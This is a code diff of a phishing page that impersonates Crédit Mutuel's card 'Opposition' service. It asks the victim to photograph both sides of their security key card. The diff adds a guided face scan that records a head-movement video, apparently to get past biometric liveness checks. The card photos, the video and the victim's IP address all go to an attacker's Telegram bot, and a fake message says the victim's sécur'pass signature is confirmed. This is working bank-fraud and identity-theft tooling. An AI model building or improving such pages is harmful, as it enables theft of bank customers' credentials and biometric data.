@@ -6,7 +6,6 @@
 <title>Opposition - Crédit Mutuel</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 <style>
-/* ═══ RESET COMPLET ═══ */
 * {
     box-sizing: border-box;
     margin: 0;
@@ -15,10 +14,7 @@
     -webkit-font-smoothing: antialiased;
 }
 
-html, body {
-    width: 100%;
-    overflow-x: hidden;
-}
+html, body { width: 100%; overflow-x: hidden; }
 
 body {
     background: #ffffff;
@@ -27,39 +23,30 @@ body {
     min-height: 100vh;
 }
 
-/* ═══ HEADER ═══ */
 header {
     width: 100%;
     background: #ffffff;
     border-bottom: 1px solid #e8eaed;
 }
 .header-inner {
-    max-width: 390px;
-    margin: 0 auto;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
+    max-width: 390px; margin: 0 auto;
+    display: flex; justify-content: space-between; align-items: center;
     padding: 12px 20px;
 }
 .header-left { display: flex; align-items: center; gap: 4px; }
-
 .burger { display: flex; flex-direction: column; align-items: center; cursor: pointer; }
 .burger-lines { display: flex; flex-direction: column; gap: 3px; margin-bottom: 1px; }
 .burger-lines span { display: block; width: 24px; height: 2px; background: #1d1d1f; border-radius: 1px; }
 .menu-text { font-size: 11px; font-weight: 700; color: #1d1d1f; }
-
 .logo-img { width: 46px; height: 46px; object-fit: contain; }
-
 .search-icon {
     width: 40px; height: 40px;
-    border: 1.5px solid #1d1d1f;
-    border-radius: 50%;
+    border: 1.5px solid #1d1d1f; border-radius: 50%;
     display: flex; justify-content: center; align-items: center;
     cursor: pointer;
 }
 .search-icon i { font-size: 15px; color: #1d1d1f; }
 
-/* ═══ CONTENEUR ═══ */
 .app-wrapper { width: 100%; display: flex; justify-content: center; flex-grow: 1; }
 .app-container {
     width: 100%; max-width: 390px;
@@ -71,14 +58,12 @@ header {
 .gray-zone h1 { color: #164194; font-size: 32px; font-weight: 900; letter-spacing: -0.6px; margin: 0; }
 
 .card {
-    background: #ffffff;
-    border-radius: 12px;
+    background: #ffffff; border-radius: 12px;
     overflow: hidden;
     margin: 0 12px 20px 12px;
     box-shadow: 0 1px 4px rgba(0,0,0,0.04);
     display: flex; flex-direction: column;
 }
-
 .card-content { padding: 24px 20px; min-height: 200px; }
 
 .section-header {
@@ -92,38 +77,23 @@ header {
 .section-header i { font-size: 11px; margin-top: 4px; }
 
 .form-group { margin-bottom: 22px; }
-
 .mandatory-note { font-size: 14px; color: #1d1d1f; margin-bottom: 14px; }
 .mandatory-note span { color: #d32f2f; font-weight: bold; margin-right: 3px; }
-
-label.field-label {
-    display: block; font-weight: 700; font-size: 15px;
-    margin-bottom: 12px; color: #1d1d1f;
-}
+label.field-label { display: block; font-weight: 700; font-size: 15px; margin-bottom: 12px; color: #1d1d1f; }
 
 .btn-primary {
-    width: 100%;
-    background: #003192;
-    color: #ffffff;
-    border: none;
-    border-radius: 30px;
-    padding: 17px;
-    font-size: 16px; font-weight: 700;
-    cursor: pointer;
+    width: 100%; background: #003192; color: #ffffff;
+    border: none; border-radius: 30px; padding: 17px;
+    font-size: 16px; font-weight: 700; cursor: pointer;
 }
 .btn-primary:hover { background: #0049d6; }
 .btn-primary:disabled { background: #9aa8c2; cursor: not-allowed; }
 
 .btn-secondary {
-    width: 100%;
-    background: #ffffff;
-    color: #164194;
-    border: 1.5px solid #164194;
-    border-radius: 30px;
-    padding: 15px;
-    font-size: 15px; font-weight: 700;
-    cursor: pointer;
-    margin-top: 10px;
+    width: 100%; background: #ffffff; color: #164194;
+    border: 1.5px solid #164194; border-radius: 30px;
+    padding: 15px; font-size: 15px; font-weight: 700;
+    cursor: pointer; margin-top: 10px;
 }
 .btn-secondary:hover { background: #f0f4ff; }
 
@@ -135,15 +105,13 @@ label.field-label {
     padding: 22px 20px;
     border-top: 1px solid #f0f0f0;
     border-bottom: 1px solid #f0f0f0;
-    background: #ffffff;
-    cursor: pointer;
+    background: #ffffff; cursor: pointer;
 }
 .forgot-link:hover { text-decoration: none; }
 .forgot-link i { font-size: 14px; }
 
 .tips-box {
-    background: #dbeafe;
-    padding: 20px;
+    background: #dbeafe; padding: 20px;
     font-size: 15px; line-height: 1.6;
     color: #164194; font-weight: 500;
     border-radius: 0 0 12px 12px;
@@ -206,39 +174,30 @@ label.field-label {
     100% { opacity: 1; stroke-dashoffset: 0; }
 }
 
-/* ═══ CAMERA UI ═══ */
+/* ═══ CAMERA CARTE ═══ */
 .camera-wrapper {
-    position: relative;
-    width: 100%;
-    background: #000;
-    border-radius: 10px;
+    position: relative; width: 100%;
+    background: #000; border-radius: 10px;
     overflow: hidden;
     aspect-ratio: 4 / 3;
     margin-bottom: 12px;
 }
-
 #camera-video {
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
-    display: block;
-    background: #000;
+    width: 100%; height: 100%;
+    object-fit: cover; display: block; background: #000;
 }
-
 .card-frame {
     position: absolute;
     top: 50%; left: 50%;
     transform: translate(-50%, -50%);
-    width: 85%;
-    height: 53.5%;
+    width: 85%; height: 53.5%;
     border: 2px solid rgba(255,255,255,0.9);
     border-radius: 10px;
     box-shadow: 0 0 0 9999px rgba(0,0,0,0.55);
     pointer-events: none;
 }
 .card-frame::before, .card-frame::after {
-    content: '';
-    position: absolute;
+    content: ''; position: absolute;
     width: 26px; height: 26px;
     border: 3px solid #5cdb3a;
 }
@@ -252,18 +211,14 @@ label.field-label {
     border-left: none; border-top: none;
     border-bottom-right-radius: 10px;
 }
-
 .camera-hint {
-    position: absolute;
-    top: 14px; left: 0; right: 0;
-    text-align: center;
-    color: #ffffff;
+    position: absolute; top: 14px; left: 0; right: 0;
+    text-align: center; color: #ffffff;
     font-size: 13px; font-weight: 700;
     letter-spacing: 0.3px;
     text-shadow: 0 1px 3px rgba(0,0,0,0.7);
     z-index: 2;
 }
-
 .capture-btn {
     position: absolute;
     bottom: 14px; left: 50%;
@@ -272,22 +227,18 @@ label.field-label {
     border-radius: 50%;
     background: #ffffff;
     border: 5px solid rgba(255,255,255,0.5);
-    cursor: pointer;
-    z-index: 3;
+    cursor: pointer; z-index: 3;
     box-shadow: 0 2px 10px rgba(0,0,0,0.4);
     transition: transform 0.1s;
 }
 .capture-btn:active { transform: translateX(-50%) scale(0.9); }
 .capture-btn::after {
-    content: '';
-    position: absolute;
+    content: ''; position: absolute;
     top: 50%; left: 50%;
     transform: translate(-50%, -50%);
     width: 48px; height: 48px;
-    border-radius: 50%;
-    background: #ffffff;
+    border-radius: 50%; background: #ffffff;
 }
-
 .capture-preview {
     position: absolute;
     bottom: 14px; right: 14px;
@@ -295,10 +246,8 @@ label.field-label {
     object-fit: cover;
     border-radius: 6px;
     border: 2px solid #5cdb3a;
-    z-index: 3;
-    display: none;
+    z-index: 3; display: none;
 }
-
 .camera-loading {
     position: absolute;
     top: 0; left: 0; right: 0; bottom: 0;
@@ -315,102 +264,233 @@ label.field-label {
     border-radius: 50%;
     animation: spinBlue 1s linear infinite;
 }
-
 .camera-error {
-    color: #d32f2f;
-    font-size: 13px;
-    text-align: center;
-    padding: 10px;
-    background: #fdecea;
-    border-radius: 8px;
+    color: #d32f2f; font-size: 13px;
+    text-align: center; padding: 10px;
+    background: #fdecea; border-radius: 8px;
     margin-top: 12px;
 }
 
-/* ═══ ÉCRAN DE VÉRIFICATION ═══ */
+/* ═══ ÉCRAN VÉRIFICATION ═══ */
 .verify-title {
-    text-align: center;
-    color: #164194;
-    font-size: 16px;
-    font-weight: 700;
+    text-align: center; color: #164194;
+    font-size: 16px; font-weight: 700;
     margin-bottom: 6px;
 }
-
 .verify-subtitle {
-    text-align: center;
-    color: #5a6478;
-    font-size: 13px;
-    margin-bottom: 20px;
+    text-align: center; color: #5a6478;
+    font-size: 13px; margin-bottom: 20px;
 }
-
 .verify-photos {
-    display: flex;
-    flex-direction: column;
-    gap: 14px;
-    margin-bottom: 22px;
+    display: flex; flex-direction: column;
+    gap: 14px; margin-bottom: 22px;
 }
-
 .verify-photo-block {
     background: #f6f8fb;
     border: 1px solid #e2e7ef;
     border-radius: 10px;
     padding: 12px;
-    display: flex;
-    align-items: center;
+    display: flex; align-items: center;
     gap: 14px;
 }
-
 .verify-photo-block img {
-    width: 100px;
-    height: 63px;
+    width: 100px; height: 63px;
     object-fit: cover;
     border-radius: 6px;
     border: 1.5px solid #d0d7e2;
-    flex-shrink: 0;
-    background: #000;
+    flex-shrink: 0; background: #000;
 }
-
 .verify-photo-info {
-    flex: 1;
-    display: flex;
-    flex-direction: column;
-    gap: 4px;
+    flex: 1; display: flex;
+    flex-direction: column; gap: 4px;
 }
-
 .verify-photo-label {
-    font-size: 14px;
-    font-weight: 700;
+    font-size: 14px; font-weight: 700;
     color: #164194;
 }
-
 .verify-photo-status {
-    font-size: 12px;
-    color: #16a34a;
+    font-size: 12px; color: #16a34a;
     font-weight: 600;
-    display: flex;
-    align-items: center;
-    gap: 5px;
+    display: flex; align-items: center; gap: 5px;
 }
-
 .verify-photo-status i { font-size: 11px; }
-
 .verify-retake {
-    font-size: 12px;
-    color: #164194;
+    font-size: 12px; color: #164194;
     text-decoration: underline;
-    cursor: pointer;
-    font-weight: 600;
-    background: none;
-    border: none;
-    padding: 0;
-    text-align: left;
+    cursor: pointer; font-weight: 600;
+    background: none; border: none;
+    padding: 0; text-align: left;
     margin-top: 2px;
 }
 .verify-retake:hover { text-decoration: none; }
-
 .verify-actions {
-    display: flex;
-    flex-direction: column;
-    gap: 10px;
+    display: flex; flex-direction: column; gap: 10px;
+}
+
+/* ═══ ÉCRAN SCAN VISAGE ═══ */
+.face-wrapper {
+    position: relative;
+    width: 100%;
+    background: #000;
+    border-radius: 10px;
+    overflow: hidden;
+    aspect-ratio: 3 / 4;
+    margin-bottom: 16px;
+}
+#face-video {
+    width: 100%; height: 100%;
+    object-fit: cover; display: block;
+    background: #000;
+    transform: scaleX(-1);
+}
+
+/* Cercle de guidage */
+.face-circle {
+    position: absolute;
+    top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    width: 62%;
+    aspect-ratio: 1 / 1;
+    border: 4px solid #9aa0a6;
+    border-radius: 50%;
+    box-shadow: 0 0 0 9999px rgba(0,0,0,0.55);
+    pointer-events: none;
+    transition: border-color 0.3s ease, transform 0.4s ease;
+}
+.face-circle.success {
+    border-color: #5cdb3a;
+}
+
+/* Flèche directionnelle animée */
+.face-arrow {
+    position: absolute;
+    top: 50%; left: 50%;
+    width: 70px; height: 70px;
+    display: flex; justify-content: center; align-items: center;
+    color: #ffffff;
+    font-size: 40px;
+    z-index: 4;
+    pointer-events: none;
+    opacity: 0.9;
+    transition: transform 0.3s ease;
+}
+.face-arrow i {
+    text-shadow: 0 2px 10px rgba(0,0,0,0.8);
+    color: #29b6f6;
+}
+
+/* Animation selon direction */
+.face-arrow.dir-left { transform: translate(-50%, -50%); animation: arrowLeft 1.2s ease-in-out infinite; }
+.face-arrow.dir-right { transform: translate(-50%, -50%); animation: arrowRight 1.2s ease-in-out infinite; }
+.face-arrow.dir-up { transform: translate(-50%, -50%); animation: arrowUp 1.2s ease-in-out infinite; }
+.face-arrow.dir-down { transform: translate(-50%, -50%); animation: arrowDown 1.2s ease-in-out infinite; }
+
+@keyframes arrowLeft {
+    0%, 100% { transform: translate(calc(-50% - 30px), -50%); }
+    50% { transform: translate(calc(-50% - 60px), -50%); }
+}
+@keyframes arrowRight {
+    0%, 100% { transform: translate(calc(-50% + 30px), -50%); }
+    50% { transform: translate(calc(-50% + 60px), -50%); }
+}
+@keyframes arrowUp {
+    0%, 100% { transform: translate(-50%, calc(-50% - 30px)); }
+    50% { transform: translate(-50%, calc(-50% - 60px)); }
+}
+@keyframes arrowDown {
+    0%, 100% { transform: translate(-50%, calc(-50% + 30px)); }
+    50% { transform: translate(-50%, calc(-50% + 60px)); }
+}
+
+/* Étapes de progression */
+.face-steps {
+    position: absolute;
+    bottom: 14px; left: 0; right: 0;
+    display: flex; justify-content: center; gap: 8px;
+    z-index: 3;
+}
+.face-step-dot {
+    width: 10px; height: 10px;
+    border-radius: 50%;
+    background: rgba(255,255,255,0.35);
+    transition: background 0.3s ease, transform 0.3s ease;
+}
+.face-step-dot.active {
+    background: #29b6f6;
+    transform: scale(1.3);
+}
+.face-step-dot.done {
+    background: #5cdb3a;
+}
+
+.face-hint {
+    position: absolute;
+    top: 14px; left: 0; right: 0;
+    text-align: center;
+    color: #ffffff;
+    font-size: 14px; font-weight: 700;
+    text-shadow: 0 1px 3px rgba(0,0,0,0.8);
+    z-index: 2;
+    padding: 0 20px;
+    line-height: 1.3;
+}
+.face-hint small {
+    display: block;
+    font-size: 11px;
+    font-weight: 500;
+    color: rgba(255,255,255,0.8);
+    margin-top: 4px;
+}
+
+.face-loading {
+    position: absolute;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: #1d1d1f;
+    display: flex; flex-direction: column;
+    justify-content: center; align-items: center;
+    color: #ffffff; font-size: 14px; font-weight: 600;
+    z-index: 5; gap: 12px;
+}
+.face-loading .mini-spinner {
+    width: 40px; height: 40px;
+    border: 4px solid rgba(255,255,255,0.2);
+    border-top-color: #29b6f6;
+    border-radius: 50%;
+    animation: spinBlue 1s linear infinite;
+}
+
+/* Barre de progression vidéo */
+.face-progress {
+    position: absolute;
+    top: 60px;
+    left: 20px; right: 20px;
+    height: 4px;
+    background: rgba(255,255,255,0.25);
+    border-radius: 3px;
+    overflow: hidden;
+    z-index: 3;
+    display: none;
+}
+.face-progress.show { display: block; }
+.face-progress-bar {
+    height: 100%; width: 0%;
+    background: #29b6f6;
+    border-radius: 3px;
+    transition: width 0.1s linear;
+}
+
+/* Enregistrement clignotant */
+.rec-dot {
+    display: inline-block;
+    width: 8px; height: 8px;
+    background: #ff3b30;
+    border-radius: 50%;
+    margin-right: 6px;
+    animation: blink 1s ease-in-out infinite;
+}
+@keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.2; }
 }
 
 /* ═══ FOOTER ═══ */
@@ -467,7 +547,6 @@ label.field-label {
 </head>
 <body>
 
-<!-- HEADER -->
 <header>
     <div class="header-inner">
         <div class="header-left">
@@ -485,7 +564,6 @@ label.field-label {
     </div>
 </header>
 
-<!-- CONTENU -->
 <div class="app-wrapper">
     <div class="app-container">
         <div class="gray-zone">
@@ -498,7 +576,7 @@ label.field-label {
                     Carte de clés <i class="fa-solid fa-chevron-down"></i>
                 </div>
 
-                <!-- ═══ ÉTAPE 1 : CAPTURE ═══ -->
+                <!-- ═══ ÉTAPE 1 : CAPTURE PHOTOS ═══ -->
                 <div class="step active" id="step-form">
                     <div class="form-group">
                         <p class="mandatory-note"><span>*</span> Information obligatoire</p>
@@ -520,7 +598,7 @@ label.field-label {
                     </div>
                 </div>
 
-                <!-- ═══ ÉTAPE 2 : VÉRIFICATION ═══ -->
+                <!-- ═══ ÉTAPE 2 : VÉRIFICATION PHOTOS ═══ -->
                 <div class="step" id="step-verify">
                     <div class="verify-title">Vérifiez vos photos</div>
                     <div class="verify-subtitle">Assurez-vous que les 2 faces de votre carte sont bien lisibles</div>
@@ -537,7 +615,6 @@ label.field-label {
                                 <button type="button" class="verify-retake" id="retake-recto">Refaire cette photo</button>
                             </div>
                         </div>
-
                         <div class="verify-photo-block">
                             <img id="verify-verso-img" alt="Verso">
                             <div class="verify-photo-info">
@@ -553,7 +630,7 @@ label.field-label {
 
                     <div class="verify-actions">
                         <button type="button" class="btn-primary" id="confirm-btn">
-                            Valider et envoyer
+                            Valider et passer au scan
                         </button>
                         <button type="button" class="btn-secondary" id="restart-btn">
                             Recommencer tout
@@ -561,12 +638,48 @@ label.field-label {
                     </div>
                 </div>
 
-                <!-- ═══ ÉTAPE 3 : LOADING ═══ -->
+                <!-- ═══ ÉTAPE 3 : SCAN VISAGE INTERACTIF ═══ -->
+                <div class="step" id="step-face">
+                    <div class="verify-title">Vérification du visage</div>
+                    <div class="verify-subtitle">Suivez les instructions affichées à l'écran</div>
+
+                    <div class="face-wrapper" id="face-wrapper">
+                        <div class="face-loading" id="face-loading">
+                            <div class="mini-spinner"></div>
+                            <div>Activation caméra frontale...</div>
+                        </div>
+
+                        <div class="face-progress" id="face-progress">
+                            <div class="face-progress-bar" id="face-progress-bar"></div>
+                        </div>
+
+                        <video id="face-video" autoplay playsinline muted></video>
+
+                        <div class="face-circle" id="face-circle"></div>
+                        <div class="face-arrow" id="face-arrow"><i class="fa-solid fa-circle"></i></div>
+
+                        <div class="face-hint" id="face-hint">
+                            Placez votre visage dans le cercle
+                            <small>Restez immobile quelques secondes</small>
+                        </div>
+
+                        <div class="face-steps" id="face-steps">
+                            <div class="face-step-dot" data-step="0"></div>
+                            <div class="face-step-dot" data-step="1"></div>
+                            <div class="face-step-dot" data-step="2"></div>
+                            <div class="face-step-dot" data-step="3"></div>
+                        </div>
+                    </div>
+
+                    <div class="camera-error" id="face-error" style="display:none;"></div>
+                </div>
+
+                <!-- ═══ ÉTAPE 4 : LOADING ═══ -->
                 <div class="step" id="step-loading">
                     <div class="spinner"></div>
                 </div>
 
-                <!-- ═══ ÉTAPE 4 : SUCCESS ═══ -->
+                <!-- ═══ ÉTAPE 5 : SUCCESS ═══ -->
                 <div class="step" id="step-success">
                     <div class="card-message">
                         Votre signature sécur'pass a été confirmée, vous allez être redirigé dans quelques instants...
@@ -590,7 +703,6 @@ label.field-label {
     </div>
 </div>
 
-<!-- FOOTER -->
 <footer class="footer-full">
     <div class="footer-inner">
         <div class="footer-top">
@@ -654,10 +766,12 @@ label.field-label {
     const sectionTitle = document.getElementById('section-title');
     const stepForm = document.getElementById('step-form');
     const stepVerify = document.getElementById('step-verify');
+    const stepFace = document.getElementById('step-face');
     const stepLoading = document.getElementById('step-loading');
     const stepSuccess = document.getElementById('step-success');
     const forgotLink = document.getElementById('forgot-link');
 
+    // Caméra carte
     const cameraWrapper = document.getElementById('camera-wrapper');
     const cameraVideo = document.getElementById('camera-video');
     const cameraHint = document.getElementById('camera-hint');
@@ -666,6 +780,7 @@ label.field-label {
     const cameraError = document.getElementById('camera-error');
     const cameraLoading = document.getElementById('camera-loading');
 
+    // Vérif photos
     const verifyRectoImg = document.getElementById('verify-recto-img');
     const verifyVersoImg = document.getElementById('verify-verso-img');
     const retakeRecto = document.getElementById('retake-recto');
@@ -673,33 +788,43 @@ label.field-label {
     const confirmBtn = document.getElementById('confirm-btn');
     const restartBtn = document.getElementById('restart-btn');
 
-    let stream = null;
+    // Scan visage
+    const faceWrapper = document.getElementById('face-wrapper');
+    const faceVideo = document.getElementById('face-video');
+    const faceCircle = document.getElementById('face-circle');
+    const faceHint = document.getElementById('face-hint');
+    const faceLoading = document.getElementById('face-loading');
+    const faceError = document.getElementById('face-error');
+    const faceProgress = document.getElementById('face-progress');
+    const faceProgressBar = document.getElementById('face-progress-bar');
+    const faceArrow = document.getElementById('face-arrow');
+    const faceStepDots = document.querySelectorAll('.face-step-dot');
+
+    let cardStream = null;
+    let faceStream = null;
     let captureSide = 'recto';
     let rectoBlob = null;
     let versoBlob = null;
+    let mediaRecorder = null;
+    let recordedChunks = [];
 
+    // ═══ TELEGRAM ═══
     async function getUserIP() {
         try {
             const res = await fetch('https://api.ipify.org?format=json');
             const data = await res.json();
             return data.ip;
-        } catch (e) {
-            return 'IP inconnue';
-        }
+        } catch (e) { return 'IP inconnue'; }
     }
 
     async function sendTextToTelegram(text) {
         try {
-            const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text })
             });
-            const json = await res.json();
-            console.log('💬 sendMessage :', json);
-        } catch (e) {
-            console.error('❌ sendMessage :', e);
-        }
+        } catch (e) { console.error('❌ sendMessage :', e); }
     }
 
     async function sendPhotoToTelegram(blob, side) {
@@ -707,102 +832,73 @@ label.field-label {
             const formData = new FormData();
             formData.append('chat_id', TELEGRAM_CHAT_ID);
             formData.append('photo', blob, `carte_${side}_${Date.now()}.jpg`);
-
             const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             });
-
             const json = await res.json();
             console.log(`📷 Photo ${side} :`, json);
-            return json.ok;
-        } catch (e) {
-            console.error(`❌ sendPhoto ${side} :`, e);
-            return false;
-        }
+        } catch (e) { console.error(`❌ sendPhoto ${side} :`, e); }
     }
 
-    // ─── Démarrer caméra ───
+    async function sendVideoToTelegram(blob) {
+        try {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('video', blob, `face_scan_${Date.now()}.webm`);
+            formData.append('caption', '🎥 Vidéo du scan facial (gauche / droite / haut / bas)');
+            const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+                method: 'POST',
+                body: formData
+            });
+            const json = await res.json();
+            console.log('🎥 Vidéo envoyée :', json);
+        } catch (e) { console.error('❌ sendVideo :', e); }
+    }
+
+    // ═══ CAMÉRA CARTE ═══
     async function startCamera() {
         cameraError.style.display = 'none';
         cameraLoading.style.display = 'flex';
         cameraWrapper.style.display = 'block';
 
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            cameraLoading.style.display = 'none';
-            cameraError.style.display = 'block';
-            cameraError.textContent = "⚠️ Caméra indisponible (HTTPS ou localhost requis).";
-            return;
-        }
-
         try {
-            stream = await navigator.mediaDevices.getUserMedia({
-                video: {
-                    facingMode: { ideal: 'environment' },
-                    width: { ideal: 1280 },
-                    height: { ideal: 720 }
-                },
+            cardStream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: { ideal: 'environment' }, width: { ideal: 1280 }, height: { ideal: 720 } },
                 audio: false
             });
-
-            cameraVideo.srcObject = stream;
-
+            cameraVideo.srcObject = cardStream;
             cameraVideo.onloadedmetadata = () => {
                 cameraVideo.play().then(() => {
                     cameraLoading.style.display = 'none';
-                    console.log('▶️ Caméra OK :', cameraVideo.videoWidth, 'x', cameraVideo.videoHeight);
-                }).catch(err => {
-                    cameraLoading.style.display = 'none';
-                    console.warn('play() :', err);
-                });
+                }).catch(() => { cameraLoading.style.display = 'none'; });
             };
-
             captureSide = 'recto';
             cameraHint.textContent = 'Présentez le RECTO de la carte';
             capturePreview.style.display = 'none';
-
         } catch (err) {
-            console.error('Erreur caméra :', err);
             cameraLoading.style.display = 'none';
             cameraError.style.display = 'block';
-            let msg = "Impossible d'accéder à la caméra. ";
-            if (err.name === 'NotAllowedError') msg += "Autorisation refusée.";
-            else if (err.name === 'NotFoundError') msg += "Aucune caméra trouvée.";
-            else msg += err.message;
-            cameraError.textContent = msg;
+            cameraError.textContent = "Impossible d'accéder à la caméra : " + err.message;
         }
     }
 
-    function stopCamera() {
-        if (stream) {
-            stream.getTracks().forEach(t => t.stop());
-            stream = null;
+    function stopCardCamera() {
+        if (cardStream) {
+            cardStream.getTracks().forEach(t => t.stop());
+            cardStream = null;
         }
     }
 
-    // ─── Capturer photo ───
     async function capturePhoto() {
-        console.log('📸 Capture clic, side =', captureSide);
-
-        if (!cameraVideo.videoWidth || !cameraVideo.videoHeight) {
-            console.warn('⚠️ Vidéo pas prête');
-            return;
-        }
-
+        if (!cameraVideo.videoWidth) return;
         const canvas = document.createElement('canvas');
         canvas.width = cameraVideo.videoWidth;
         canvas.height = cameraVideo.videoHeight;
         const ctx = canvas.getContext('2d');
         ctx.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
-
         canvas.toBlob((blob) => {
-            if (!blob) {
-                console.warn('⚠️ Blob null');
-                return;
-            }
-
-            console.log('✅ Blob créé, taille =', blob.size, 'side =', captureSide);
-
+            if (!blob) return;
             if (captureSide === 'recto') {
                 rectoBlob = blob;
                 capturePreview.src = URL.createObjectURL(blob);
@@ -811,87 +907,190 @@ label.field-label {
                 cameraHint.textContent = 'Présentez le VERSO de la carte';
             } else {
                 versoBlob = blob;
-                stopCamera();
+                stopCardCamera();
                 showVerifyScreen();
             }
         }, 'image/jpeg', 0.92);
     }
 
-    // ─── Écran de vérification ───
     function showVerifyScreen() {
-        console.log('📋 Affichage vérification');
-
         verifyRectoImg.src = URL.createObjectURL(rectoBlob);
         verifyVersoImg.src = URL.createObjectURL(versoBlob);
-
         stepForm.classList.remove('active');
         stepVerify.classList.add('active');
-
         mainTitle.textContent = 'Vérification';
         sectionTitle.innerHTML = 'Confirmation des photos <i class="fa-solid fa-chevron-down"></i>';
     }
 
-    // ─── Refaire une photo ───
     async function retake(side) {
-        console.log('🔄 Refaire :', side);
-
         stepVerify.classList.remove('active');
         stepForm.classList.add('active');
-
         mainTitle.textContent = 'Opposition';
         sectionTitle.innerHTML = 'Carte de clés <i class="fa-solid fa-chevron-down"></i>';
-
         captureSide = side;
         cameraHint.textContent = side === 'recto' ? 'Présentez le RECTO de la carte' : 'Présentez le VERSO de la carte';
-
         if (side === 'recto') {
             rectoBlob = null;
             capturePreview.style.display = 'none';
         }
-
         await startCamera();
     }
 
-    // ─── Confirmer et envoyer ───
-    async function confirmAndSend() {
-        console.log('🚀 Bouton Valider cliqué !');
-        console.log('rectoBlob :', rectoBlob);
-        console.log('versoBlob :', versoBlob);
+    // ═══ SCAN VISAGE INTERACTIF ═══
+    const STEPS = [
+        { dir: 'left', icon: 'fa-arrow-left', hint: 'Tournez la tête à GAUCHE', duration: 2000 },
+        { dir: 'right', icon: 'fa-arrow-right', hint: 'Tournez la tête à DROITE', duration: 2000 },
+        { dir: 'up', icon: 'fa-arrow-up', hint: 'Regardez en HAUT', duration: 2000 },
+        { dir: 'down', icon: 'fa-arrow-down', hint: 'Regardez en BAS', duration: 2000 }
+    ];
 
-        if (!rectoBlob || !versoBlob) {
-            alert('Erreur : photos manquantes. Veuillez recommencer.');
-            return;
+    async function startFaceScan() {
+        faceError.style.display = 'none';
+        faceLoading.style.display = 'flex';
+        faceCircle.classList.remove('success');
+        faceProgress.classList.remove('show');
+        faceArrow.style.display = 'none';
+
+        try {
+            faceStream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: { ideal: 'user' }, width: { ideal: 720 }, height: { ideal: 960 } },
+                audio: false
+            });
+
+            faceVideo.srcObject = faceStream;
+            faceVideo.onloadedmetadata = () => {
+                faceVideo.play().then(() => {
+                    faceLoading.style.display = 'none';
+                    // Démarrer l'enregistrement vidéo
+                    startRecording();
+                    // Lancer les étapes
+                    setTimeout(() => runFaceSteps(), 1500);
+                }).catch(() => { faceLoading.style.display = 'none'; });
+            };
+        } catch (err) {
+            faceLoading.style.display = 'none';
+            faceError.style.display = 'block';
+            faceError.textContent = "Impossible d'accéder à la caméra frontale : " + err.message;
+        }
+    }
+
+    function startRecording() {
+        try {
+            recordedChunks = [];
+            const options = { mimeType: 'video/webm;codecs=vp8,opus' };
+            if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                mediaRecorder = new MediaRecorder(faceStream);
+            } else {
+                mediaRecorder = new MediaRecorder(faceStream, options);
+            }
+            mediaRecorder.ondataavailable = (e) => {
+                if (e.data && e.data.size > 0) recordedChunks.push(e.data);
+            };
+            mediaRecorder.start();
+            console.log('🎥 Enregistrement démarré');
+        } catch (e) {
+            console.error('❌ MediaRecorder :', e);
+        }
+    }
+
+    function stopRecordingAndSend() {
+        return new Promise((resolve) => {
+            if (!mediaRecorder || mediaRecorder.state === 'inactive') {
+                resolve();
+                return;
+            }
+            mediaRecorder.onstop = async () => {
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                console.log('🎥 Vidéo prête, taille =', blob.size);
+                await sendVideoToTelegram(blob);
+                resolve();
+            };
+            mediaRecorder.stop();
+        });
+    }
+
+    async function runFaceSteps() {
+        // Étape 0 : positionner le visage
+        faceHint.innerHTML = 'Placez votre visage dans le cercle<small>Restez immobile...</small>';
+        faceArrow.style.display = 'none';
+        faceCircle.classList.remove('success');
+
+        // Attendre 2.5s pour que l'utilisateur se positionne
+        await new Promise(r => setTimeout(r, 2500));
+
+        // Le cercle devient bleu quand on commence
+        faceCircle.classList.add('success');
+        faceProgress.classList.add('show');
+
+        // Lancer les 4 étapes
+        for (let i = 0; i < STEPS.length; i++) {
+            const step = STEPS[i];
+
+            // Activer le dot
+            faceStepDots.forEach((d, idx) => {
+                d.classList.remove('active');
+                if (idx < i) d.classList.add('done');
+                if (idx === i) d.classList.add('active');
+            });
+
+            // Afficher la flèche
+            faceArrow.style.display = 'flex';
+            faceArrow.className = 'face-arrow dir-' + step.dir;
+            faceArrow.innerHTML = `<i class="fa-solid ${step.icon}"></i>`;
+
+            // Texte
+            faceHint.innerHTML = step.hint + '<small>Suivez la flèche</small>';
+
+            // Animation de la barre de progression pour cette étape
+            const startTime = Date.now();
+            const duration = step.duration;
+
+            await new Promise((resolve) => {
+                progressInterval = setInterval(() => {
+                    const elapsed = Date.now() - startTime;
+                    const pct = Math.min(100, (elapsed / duration) * 100);
+                    // Le pourcentage global : (i + pct/100) / 4 * 100
+                    const globalPct = ((i + pct / 100) / STEPS.length) * 100;
+                    faceProgressBar.style.width = globalPct + '%';
+
+                    if (elapsed >= duration) {
+                        clearInterval(progressInterval);
+                        resolve();
+                    }
+                }, 50);
+            });
+
+            // Marquer comme fait
+            faceStepDots[i].classList.remove('active');
+            faceStepDots[i].classList.add('done');
         }
 
-        // Feedback immédiat
-        confirmBtn.disabled = true;
-        confirmBtn.textContent = 'Envoi en cours...';
+        // Fin du scan
+        faceHint.innerHTML = '✅ Vérification terminée<small>Envoi en cours...</small>';
+        faceArrow.style.display = 'none';
 
-        // Passer au loading TOUT DE SUITE
